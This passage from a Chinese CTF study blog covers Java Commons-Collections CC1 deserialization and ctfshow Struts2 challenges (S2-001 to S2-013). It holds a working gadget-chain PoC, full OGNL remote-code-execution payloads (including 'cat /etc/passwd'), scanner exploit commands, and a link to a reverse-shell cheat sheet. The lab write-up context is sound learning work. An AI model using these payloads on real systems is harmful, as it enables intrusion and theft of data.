class="params">(String[] args)</span> <span class="keyword">throws</span> Exception</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="comment">//简单弹个计算器</span></span><br><span class="line">        <span class="comment">//Runtime.getRuntime().exec(&quot;calc&quot;);</span></span><br><span class="line">        <span class="comment">//用反射弹个计算器</span></span><br><span class="line">        <span class="comment">// Runtime r = Runtime.getRuntime(); 这个不能进行序列化操作，所以我们得通过反射进行操作</span></span><br><span class="line"><span class="comment">//        Class c = Runtime.class;</span></span><br><span class="line"><span class="comment">//        Method execMethod = c.getMethod(&quot;exec&quot;,String.class);</span></span><br><span class="line"><span class="comment">//        execMethod.invoke(r,&quot;calc&quot;);</span></span><br><span class="line">        <span class="comment">//利用 InvokerTransformer弹个计算器</span></span><br><span class="line">        <span class="comment">//InvokerTransformer invokerTransformer = new InvokerTransformer(&quot;exec&quot;,new Class[]&#123;String.class&#125;,new Object[]&#123;&quot;calc&quot;&#125;);</span></span><br><span class="line"><span class="comment">//        HashMap map = new HashMap&lt;&gt;();</span></span><br><span class="line"><span class="comment">//        map.put(&quot;key&quot;,&quot;value&quot;);  //写这里的原因是为了下面的遍历</span></span><br><span class="line"><span class="comment">//        //利用Map.Entry的遍历通过setValue调用checkSetValue</span></span><br><span class="line"><span class="comment">//        Map&lt;Object,Object&gt; transformedMap = TransformedMap.decorate(map,null,invokerTransformer);</span></span><br><span class="line"><span class="comment">//        for(Map.Entry entry:transformedMap.entrySet())</span></span><br><span class="line"><span class="comment">//        &#123;</span></span><br><span class="line">        <span class="comment">//entry.setValue(r);//给r的话，那么checkSetValue里的value值也是r，所以会弹出计算器</span></span><br><span class="line"><span class="comment">//        &#125;</span></span><br><span class="line">        <span class="comment">//下面是写好的通过反射来调用Runtime.getEuntime()</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//        Method getRuntimeMethod = (Method) new InvokerTransformer(&quot;getMethod&quot;,new Class[]&#123;String.class,Class[].class&#125;,new Object[]&#123;&quot;getRuntime&quot;,null&#125;).transform(Runtime.class);</span></span><br><span class="line"><span class="comment">//        //上面的代码是为了替代下面的1</span></span><br><span class="line"><span class="comment">//       Runtime r =(Runtime) new InvokerTransformer(&quot;invoke&quot;,new Class[]&#123;Object.class, Object[].class&#125;,new Object[]&#123;null,null&#125;).transform(getRuntimeMethod);</span></span><br><span class="line"><span class="comment">//       //上面的代码是为了替代下面的2</span></span><br><span class="line"><span class="comment">//        new InvokerTransformer(&quot;exec&quot;,new Class[]&#123;String.class&#125;,new Object[]&#123;&quot;calc&quot;&#125;).transform(r);</span></span><br><span class="line"><span class="comment">//        //上面的代码是为了替代下面的3</span></span><br><span class="line"><span class="comment">//        Class c = Runtime.class;</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">//因为上面的方法的话是对transform进行循环调用的，所以我们可以利用ChainedTransformer进行循环利用,这个函数的构造函数是传一个transform数组进去，然后对其循环调用</span></span><br><span class="line">        Transformer[] Transformer = <span class="keyword">new</span> <span class="title class_">Transformer</span>[]</span><br><span class="line">                &#123;</span><br><span class="line">                        <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;getMethod&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class,Class[].class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;getRuntime&quot;</span>,<span class="literal">null</span>&#125;),</span><br><span class="line">                        <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;invoke&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Object.class, Object[].class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="literal">null</span>,<span class="literal">null</span>&#125;),</span><br><span class="line">                        <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;calc&quot;</span>&#125;)</span><br><span class="line">                &#125;;</span><br><span class="line">        <span class="type">ChainedTransformer</span> <span class="variable">chainedTransformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(Transformer);</span><br><span class="line">        chainedTransformer.transform(Runtime.class); <span class="comment">///这里的话是只有这个Runtime是由我们控制的,这里的话是只调用一次transform.</span></span><br><span class="line">            <span class="comment">//Method getRuntimeMethod = c.getMethod(&quot;getRuntime&quot;,null);//1</span></span><br><span class="line">            <span class="comment">//Runtime r =(Runtime) getRuntimeMethod.invoke(null,null);//2</span></span><br><span class="line">           <span class="comment">// Method execMethod = c.getMethod(&quot;exec&quot;, String[].class);//3</span></span><br><span class="line">            <span class="comment">//execMethod.invoke(r,&quot;calc&quot;);//3</span></span><br><span class="line"><span class="comment">//        Class c = Class.forName(&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;);</span></span><br><span class="line"><span class="comment">//        //这因为AnnotationInvocationHandler没有定义为public，所以不能直接获取，得通过反射来进行获取</span></span><br><span class="line"><span class="comment">//        Constructor annotationInvocationConstructor = c.getDeclaredConstructor(Class.class,Map.class);</span></span><br><span class="line"><span class="comment">//        annotationInvocationConstructor.setAccessible(true);</span></span><br><span class="line"><span class="comment">//        Object o = annotationInvocationConstructor.newInstance(Override.class,transformedMap);</span></span><br><span class="line"><span class="comment">//        //上面的那个代码时替代上面那个for循环的setValue();  因为就是AnnotationInvocationHandler的readObject里面调用了setValue</span></span><br><span class="line"><span class="comment">//        serialize(o);</span></span><br><span class="line"><span class="comment">//        unserialize(&quot;ser.bin&quot;);</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        <span class="comment">//1.最后 得重新搞  因为runtime不能进行序列化</span></span><br><span class="line">        <span class="comment">//2.AnnotationInvocationHandler里的readObject()处那调用的setValue()哪有两个if得进行绕过</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">serialize</span><span class="params">(Object obj)</span> <span class="keyword">throws</span> IOException</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">oss</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(<span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="string">&quot;ser.bin&quot;</span>));</span><br><span class="line">        oss.writeObject(obj);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> Object <span class="title function_">unserialize</span><span class="params">(String Filename)</span> <span class="keyword">throws</span> IOException,ClassNotFoundException</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="type">ObjectInputStream</span> <span class="variable">ois</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(<span class="keyword">new</span> <span class="title class_">FileInputStream</span>(Filename));</span><br><span class="line">        <span class="type">Object</span> <span class="variable">obj</span> <span class="operator">=</span> ois.readObject();</span><br><span class="line">        <span class="keyword">return</span> obj;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>上面的代码时学习cc1时调试的代码，这里有一个坑就是得先跟着上面的视频进行调试，不然的话会复现不成功。</p><p>这里的话由于自己懒  所以用这篇文章来进行学习   <a href="https://www.cnblogs.com/LeslieSec/p/17112646.html">文章</a></p><p>（只是写一些我看的时候的见解）</p><p><img src="../images/image-20230308162258990.png" alt="image-20230308162258990"></p><p>这里虽然传了valueTransformer的值，但是</p><p><img src="../images/image-20230308162354429.png" alt="image-20230308162354429"></p><p>这个value没有传，所以跟进文章的下一步操作。</p><p><img src="../images/image-20230308163906186.png" alt="image-20230308163906186"></p><p>这里传transformedMap的原因是因为Map可控<img src="../images/image-20230308163951871.png" alt="image-20230308163951871"></p><p>transformedMap在这里的是因为得遍历然后触发setValue();</p><p>那两个if绕过的解释</p><p><img src="../images/image-20230308170126953.png" alt="image-20230308170126953"></p><p><img src="../images/image-20230308170141736.png" alt="image-20230308170141736"></p><p><code>memberValue.getValue();</code>  <code>memberTypes.get(name);</code>在map修改key名为value的时候，那么get(name)就会调用到Target的value从而能绕过判断</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">memberType.isInstance(value)  这个的话绕过应该是因为constructor.newInstance(Target.class,transformedMap);这个实例化对象的时候传进来了Target,并且这个里面刚好有value</span><br></pre></td></tr></table></figure><p><strong>poc</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">Transformer[] transformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;</span><br><span class="line">                <span class="comment">//避免被readObject修改</span></span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(Runtime.class),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;getMethod&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class,Class[].class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;getRuntime&quot;</span>,<span class="literal">null</span>&#125;),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;invoke&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Object.class,Object[].class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="literal">null</span>,<span class="literal">null</span>&#125;),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;calc&quot;</span>&#125;)</span><br><span class="line">        &#125;;</span><br><span class="line">        <span class="type">ChainedTransformer</span> <span class="variable">chainedTransformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(transformers);</span><br><span class="line">        HashMap&lt;Object,Object&gt; map = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;Object, Object&gt;();</span><br><span class="line">        map.put(<span class="string">&quot;value&quot;</span>,<span class="string">&quot;value&quot;</span>);</span><br><span class="line">        Map&lt;Object,Object&gt; transformedMap  = TransformedMap.decorate(map,<span class="literal">null</span>,chainedTransformer);</span><br><span class="line">        <span class="type">Class</span> <span class="variable">c</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;</span>);</span><br><span class="line">        <span class="type">Constructor</span> <span class="variable">constructor</span> <span class="operator">=</span> c.getDeclaredConstructor(Class.class,Map.class);</span><br><span class="line">        constructor.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        <span class="comment">//第一个参数继承了注解，我们先用override尝试</span></span><br><span class="line">        <span class="type">Object</span> <span class="variable">o</span> <span class="operator">=</span> constructor.newInstance(Target.class,transformedMap);</span><br><span class="line">        serialize(o);</span><br><span class="line">        unserialize(<span class="string">&quot;ser.bin&quot;</span>);</span><br></pre></td></tr></table></figure><p>这个poc链子的顺序就是  </p><p>InvokerTransformer  —&gt;  transformers   —&gt;  transformedMap  —&gt;  decorate  —&gt;checkSetValue  —&gt; setValue —&gt;  AnnotationInvocationHandler的readObject</p><p>这就是整条链子的顺序  里面最重要的方法就是<strong>反射</strong></p><h3 id="cc6"><a href="#cc6" class="headerlink" title="cc6"></a>cc6</h3>]]></content>
      
      
      
        <tags>
            
            <tag> ctfshow java反序列化 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>反弹shell</title>
      <link href="/posts/2f610211.html"/>
      <url>/posts/2f610211.html</url>
      
        <content type="html"><![CDATA[<p><a href="https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md#awk">反弹shell大合集</a></p><p>里面还有工具</p>]]></content>
      
      
      
        <tags>
            
            <tag> 反弹shell大全 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ctfshow-JAVA 刷题记录</title>
      <link href="/posts/1c639bd.html"/>
      <url>/posts/1c639bd.html</url>
      
        <content type="html"><![CDATA[<p><strong>脚本通杀</strong></p><p>  <strong>WEB279-294 296-297</strong></p><p>以下题目参考 ——&gt; <a href="https://blog.csdn.net/q20010619/article/details/120729447">文章</a></p><p>全部题都是struts2框架漏洞</p><p>脚本通杀 下载 下载链接：<a href="https://pan.b类似/aidu.com/s/19yr0tWbG1UU_ULjEan5ttQ">https://pan.b类似/aidu.com/s/19yr0tWbG1UU_ULjEan5ttQ</a> 提取码：bn71<br>具体用法在md文件中，例如<br>检测</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python Struts2Scan.py -u http://94c4c47e-4fb3-408c-97d7-56a5094f84a7.chall.ctf.show/S2-001/login.action</span><br></pre></td></tr></table></figure><p>利用</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python Struts2Scan.py -u http://94c4c47e-4fb3-408c-97d7-56a5094f84a7.chall.ctf.show/S2-001/login.action -n S2-001 --exec</span><br></pre></td></tr></table></figure><p><strong>执行命令env即可得到flag</strong></p><p>Struts2是用Java语言编写的一个基于MVC设计模式的Web应用框架</p><p>关于struts2漏洞，vulhub都有环境并且给出了漏洞原理和poc</p><p>GitHub项目地址：<a href="https://github.com/vulhub/vulhub/tree/master/struts2">https://github.com/vulhub/vulhub/tree/master/struts2</a></p><p><strong>判断网站是否基于Struts2的方法</strong></p><p>通过页面回显的错误消息来判断，页面不回显错误消息时则无效<br>通过网页后缀来判断，如.do.action，有可能不准<br>如果配置文件中常数extension的值以逗号结尾或者有空值，指明了action可以不带后缀，那么不带后缀的uri也可能是struts2框架搭建的<br>如果使用Struts2的rest插件，其默认的struts-plugin.xml指定的请求后缀为xhtml,xml和json<br>判断 /struts/webconsole.html 是否存在来进行判断，需要 devMode 为 true</p><p><strong>这里的话也记录一下我学习java的过程</strong></p><h2 id="web279-S2-001"><a href="#web279-S2-001" class="headerlink" title="web279-S2-001"></a>web279-S2-001</h2><p>题目</p><p><img src="../images/image-20230221220243509.png" alt="image-20230221220243509"></p><p>打开源码发现</p><p>存在一个路径，然后访问得到</p><p><img src="../images/image-20230221220331569.png" alt="image-20230221220331569"></p><p>s2-001是一个struts2命令执行漏洞编号，这篇文章给了详细介绍<a href="https://www.freebuf.com/column/224041.html">链接</a></p><p><strong>漏洞原理</strong></p><blockquote><p>struts2漏洞 S2-001是当用户提交表单数据且验证失败时，服务器使用OGNL表达式解析用户先前提交的参数值，%{value}并重新填充相应的表单数据</p></blockquote><p>这里的话和ssti还有点像，因为就是  <strong>%{1+1}</strong>   可以生成2   这是个<strong>OGNL表达式</strong></p><p>这里的话会对下面三个东西进行解释</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">% 的用途是在标志的属性为字符串类型时，计算OGNL表达式%&#123;&#125;中的值</span><br><span class="line"># 的用途访主要是访问非根对象属性，因为Struts 2中值栈被视为根对象，所以访问其他非根对象时，需要加#前缀才可以调用</span><br><span class="line">$ 主要是在Struts 2配置文件中，引用OGNL表达式</span><br></pre></td></tr></table></figure><p><strong>payload</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 获取tomcat路径</span></span><br><span class="line">%&#123;<span class="string">&quot;tomcatBinDir&#123;&quot;</span>+<span class="meta">@java</span>.lang.System<span class="meta">@getProperty(&quot;user.dir&quot;)</span>+<span class="string">&quot;&#125;&quot;</span>&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 获取web路径</span></span><br><span class="line">%&#123;#req=<span class="meta">@org</span>.apache.struts2.ServletActionContext<span class="meta">@getRequest()</span>,#response=#context.get(<span class="string">&quot;com.opensymphony.xwork2.dispatcher.HttpServletResponse&quot;</span>).getWriter(),#response.println(#req.getRealPath(<span class="string">&#x27;/&#x27;</span>)),#response.flush(),#response.close()&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 命令执行 env，flag就在其中</span></span><br><span class="line">password=%&#123;#a=(<span class="keyword">new</span> <span class="title class_">java</span>.lang.ProcessBuilder(<span class="keyword">new</span> <span class="title class_">java</span>.lang.String[]&#123;<span class="string">&quot;env&quot;</span>&#125;)).redirectErrorStream(<span class="literal">true</span>).start(),#b=#a.getInputStream(),#c=<span class="keyword">new</span> <span class="title class_">java</span>.io.InputStreamReader(#b),#d=<span class="keyword">new</span> <span class="title class_">java</span>.io.BufferedReader(#c),#e=<span class="keyword">new</span> <span class="title class_">char</span>[<span class="number">50000</span>],#d.read(#e),#f=#context.get(<span class="string">&quot;com.opensymphony.xwork2.dispatcher.HttpServletResponse&quot;</span>),#f.getWriter().println(<span class="keyword">new</span> <span class="title class_">java</span>.lang.String(#e)),#f.getWriter().flush(),#f.getWriter().close()&#125;&amp;username=<span class="number">1</span></span><br><span class="line"><span class="comment">//这里的命令执行就是修改env就行了，相查啥就去修改</span></span><br></pre></td></tr></table></figure><p>这里的话虽然payload看不懂什么意思，但是得把里面一些东西进行研究研究</p><p><a href="https://blog.csdn.net/weixin_43748564/article/details/107375850">“@” Java中的特殊符号——注解（Java中’@‘符号是什么意思？）</a></p><p><a href="https://blog.csdn.net/u012834750/article/details/79361552">java.lang包介绍</a></p><p><a href="https://zhuanlan.zhihu.com/p/98094713">一篇彻底读懂java中的IO流！</a></p><p>也可以利用工具进行解题</p><h2 id="web280-S2-005"><a href="#web280-S2-005" class="headerlink" title="web280-S2-005"></a>web280-S2-005</h2><p>题目</p><p><img src="../images/image-20230221223022301.png" alt="image-20230221223022301"></p><p><strong>漏洞原理</strong></p><p>先来了解下S2-003</p><p>Struts2将HTTP的每个参数名解析为ognl语句执行,而ognl表达式是通过#来访问struts的对象，Struts2框架虽然过滤了#来进行过滤，但是可以通过unicode编码（u0023）或8进制（43）绕过了安全限制，达到代码执行的效果</p><p><strong>影响版本：Struts 2.0.0 - Struts 2.0.11.2</strong></p><p>再看S2-005，<a href="https://www.freebuf.com/vuls/193078.html">参考链接</a></p><p>S2-005和S2-003的原理是类似的，因为官方在修补S2-003不全面，导致用户可以绕过官方的安全配置（禁止静态方法调用和类方法执行），再次造成的漏洞，可以说是升级版的S2-005是升级版的S2-003</p><p><strong>影响版本</strong>：<strong>Struts 2.0.0 - Struts 2.1.8.1</strong></p><p>这题的话是利用工具来解题的</p><p>查漏洞 </p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python Struts2Scan.py -u http://d6000b7a-d2b5-47b4-<span class="number">8133</span>-e503ee337f51.challenge.ctf.show/S2-005/example/HelloWorld.action</span><br></pre></td></tr></table></figure><p><img src="../images/image-20230221224315378.png" alt="image-20230221224315378"></p><p>利用网上的工具得出确实是存在<strong>S2-005</strong>漏洞</p><p>那么直接利用工具打就行了。</p><p>利用漏洞进行命令执行</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python Struts2Scan.py -u http://33f274f4-42ec-4646-a3e0-5670b693959b.challenge.ctf.show/S2-005/example/HelloWorld.action -n S2-005 --exec</span><br></pre></td></tr></table></figure><p>然后输入env就可以看到flag了。</p><p><img src="../images/image-20230222102511636.png" alt="image-20230222102511636"></p><h2 id="web281-S2-007"><a href="#web281-S2-007" class="headerlink" title="web281-S2-007"></a>web281-S2-007</h2><p><strong>漏洞原理</strong></p><blockquote><p>当配置了验证规则 <code>&lt;ActionName&gt;-validation.xml</code> 时，若类型验证转换出错，后端默认会将用户提交的表单值通过字符串拼接，然后执行一次 OGNL 表达式解析并返回</p><p><strong>影响版本</strong>：Struts2 2.0.0 - Struts2 2.2.3</p></blockquote><p>执行任意代码poc</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&#x27; + (#_memberAccess[&quot;allowStaticMethodAccess&quot;]=true,#foo=new java.lang.Boolean(&quot;false&quot;) ,#context[&quot;xwork.MethodAccessor.denyMethodExecution&quot;]=#foo,@org.apache.commons.io.IOUtils@toString(@java.lang.Runtime@getRuntime().exec(&#x27;</span>id<span class="string">&#x27;).getInputStream())) + &#x27;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>在id处修改命令就行</p><p><img src="../images/image-20230222103018669.png" alt="image-20230222103018669"></p><p>在age处可以进行输出。</p><p>然后把id修改成env就可以看到flag了。</p><p>用工具其实也是可以的</p><p><strong>查漏洞</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python Struts2Scan.py -u http://016b938b-1b04-<span class="number">4939</span>-bfbf-d66ff6df2ccf.challenge.ctf.show/S2-007/user.action</span><br></pre></td></tr></table></figure><p><img src="../images/image-20230222103423727.png" alt="image-20230222103423727"></p><p>但是利用工具来看的话这里不是s2-007漏洞，有点奇怪。</p><p><img src="../images/image-20230222103701552.png" alt="image-20230222103701552"></p><h2 id="web282-S2-008"><a href="#web282-S2-008" class="headerlink" title="web282-S2-008"></a>web282-S2-008</h2><p>题目</p><p><img src="../images/image-20230222104319076.png" alt="image-20230222104319076"></p><p><strong>漏洞原理</strong></p><p>S2-008 涉及多个漏洞，Cookie 拦截器错误配置可造成 OGNL 表达式执行，但是由于大多 Web 容器（如 Tomcat）对 Cookie 名称都有字符限制，一些关键字符无法使用使得这个点显得比较鸡肋。另一个比较鸡肋的点就是在 struts2 应用开启 devMode 模式后会有多个调试接口能够直接查看对象信息或直接执行命令，正如 kxlzx 所提这种情况在生产环境中几乎不可能存在，因此就变得很鸡肋的，但我认为也不是绝对的，万一被黑了专门丢了一个开启了 debug 模式的应用到服务器上作为后门也是有可能的</p><p><strong>姿势1</strong></p><p>虽然在struts2没有对恶意代码进行限制，但是java的webserver（Tomcat），对cookie的名称有较多限制，在传入struts2之前就被处理，从而较为鸡肋</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Cookie:(<span class="string">&#x27;#_memberAccess.setAllowStaticMethodAccess(true)&#x27;</span>)(<span class="number">1</span>)(<span class="number">2</span>)=Aluvion; (<span class="string">&#x27;@java.lang.Runtime@getRuntime().exec(&quot;calc&quot;)&#x27;</span>)(<span class="number">1</span>)(<span class="number">2</span>)=Twings;</span><br></pre></td></tr></table></figure><p>没测试成功。</p><p><strong>姿势2</strong></p><p>开启了调试模式，但是调试模式中存在 OGNL 表达式注入漏洞</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">devmode.action?debug=command&amp;expression=(%23_memberAccess%5B%22allowStaticMethodAccess%<span class="number">22</span>%<span class="number">5D</span>%3Dtrue%2C%23foo%3Dnew%20java.lang.Boolean%<span class="number">28</span>%22false%<span class="number">22</span>%<span class="number">29</span>%<span class="number">20</span>%2C%23context%5B%22xwork.MethodAccessor.denyMethodExecution%<span class="number">22</span>%<span class="number">5D</span>%<span class="number">3D</span>%23foo%2C<span class="meta">@org</span>.apache.commons.io.IOUtils<span class="meta">@toString</span>%<span class="number">28</span><span class="meta">@java</span>.lang.Runtime<span class="meta">@getRuntime</span>%<span class="number">28</span>%<span class="number">29.</span>exec%<span class="number">28</span>%27env%<span class="number">27</span>%<span class="number">29.</span>getInputStream%<span class="number">28</span>%<span class="number">29</span>%<span class="number">29</span>)</span><br></pre></td></tr></table></figure><p>想要修改啥，还是把env换掉就行。</p><p>这题也是可以利用工具进行求解</p><h2 id="web283-S2-009"><a href="#web283-S2-009" class="headerlink" title="web283-S2-009"></a>web283-S2-009</h2><p>题目</p><p>提示：<strong>Struts2 showcase远程代码执行漏洞</strong></p><p>测试环境是一个struts2的“功能展示”网站<code>Struts Showcase</code>，代码很多，我们的目标是去找一个接受了参数，参数类型是string的action</p><p><img src="../images/image-20230222114920873.png" alt="image-20230222114920873"></p><p><code>url/S2-009/ajax/example5.action</code>即可访问控制器</p><p><img src="../images/image-20230222115312683.png" alt="image-20230222115312683"></p><p>写入payload后，会自动下载一个example.action文件，然后打开</p><p><img src="../images/image-20230222115455895.png" alt="image-20230222115455895"></p><p>那么我们就只需要修改payload里的<strong>whoami</strong>换成<strong>env</strong>就能拿到flag了</p><p>这里的话也可以使用工具</p><p>但是工具只能查出是哪个漏洞，但是这个工具不支持漏洞利用</p><h2 id="web284-S2-012"><a href="#web284-S2-012" class="headerlink" title="web284-S2-012"></a>web284-S2-012</h2><p>题目</p><p><img src="../images/image-20230222203744432.png" alt="image-20230222203744432"></p><p>由题目可知这是个编号为S2-012的漏洞</p><p><strong>漏洞原理</strong></p><p>如果在配置 Action 中 Result 时使用了重定向类型，并且还使用 ${param_name} 作为重定向变量，例如：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">&lt;<span class="keyword">package</span> name=<span class="string">&quot;S2-012&quot;</span> extends=<span class="string">&quot;struts-default&quot;</span>&gt;</span><br><span class="line">    &lt;action name=<span class="string">&quot;user&quot;</span> class=<span class="string">&quot;com.demo.action.UserAction&quot;</span>&gt;</span><br><span class="line">        &lt;result name=<span class="string">&quot;redirect&quot;</span> type=<span class="string">&quot;redirect&quot;</span>&gt;/index.jsp?name=$&#123;name&#125;&lt;/result&gt;</span><br><span class="line">        &lt;result name=<span class="string">&quot;input&quot;</span>&gt;/index.jsp&lt;/result&gt;</span><br><span class="line">        &lt;result name=<span class="string">&quot;success&quot;</span>&gt;/index.jsp&lt;/result&gt;</span><br><span class="line">    &lt;/action&gt;</span><br><span class="line">&lt;/<span class="keyword">package</span>&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>这里 UserAction 中定义有一个 name 变量，当触发 redirect 类型返回时，Struts2 获取使用 ${name} 获取其值，在这个过程中会对 name 参数的值执行 OGNL 表达式解析，从而可以插入任意 OGNL 表达式导致命令执行</p><p>影响版本: 2.1.0 - 2.3.13</p><p><strong>payload</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">%&#123;#a=(<span class="keyword">new</span> <span class="title class_">java</span>.lang.ProcessBuilder(<span class="keyword">new</span> <span class="title class_">java</span>.lang.String[]&#123;<span class="string">&quot;cat&quot;</span>, <span class="string">&quot;/etc/passwd&quot;</span>&#125;)).redirectErrorStream(<span class="literal">true</span>).start(),#b=#a.getInputStream(),#c=<span class="keyword">new</span> <span class="title class_">java</span>.io.InputStreamReader(#b),#d=<span class="keyword">new</span> <span class="title class_">java</span>.io.BufferedReader(#c),#e=<span class="keyword">new</span> <span class="title class_">char</span>[<span class="number">50000</span>],#d.read(#e),#f=#context.get(<span class="string">&quot;com.opensymphony.xwork2.dispatcher.HttpServletResponse&quot;</span>),#f.getWriter().println(<span class="keyword">new</span> <span class="title class_">java</span>.lang.String(#e)),#f.getWriter().flush(),#f.getWriter().close()&#125;</span><br></pre></td></tr></table></figure><p><img src="../images/image-20230222204310623.png" alt="image-20230222204310623"></p><p>执行后会下载一个文件，然后只需要修改一下执行命令(env)就可以拿到flag了。</p><h2 id="web285-S2-013"><a href="#web285-S2-013" class="headerlink" title="web285-S2-013"></a>web285-S2-013</h2><p>题目</p><p><img src="../images/image-20230222204630266.png" alt="image-20230222204630266"></p><p><strong>漏洞原理</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">Struts2 标签中 &lt;s:a&gt; 和 &lt;s:url&gt; 都包含一个 includeParams 属性，其值可设置为 none，get 或 all，参考官方其对应意义如下：</span><br><span class="line"></span><br><span class="line">none - 链接不包含请求的任意参数值（默认）</span><br><span class="line">get - 链接只包含 GET 请求中的参数和其值</span><br><span class="line">all - 链接包含 GET 和 POST 所有参数和其值</span><br><span class="line">&lt;s:a&gt;用来显示一个超链接，当includeParams=all的时候，会将本次请求的GET和POST参数都放在URL的GET参数上。在放置参数的过程中会将参数进行OGNL渲染，造成任意命令执行漏洞</span><br></pre></td></tr></table></figure><p><strong>poc</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">$&#123;(#_memberAccess[<span 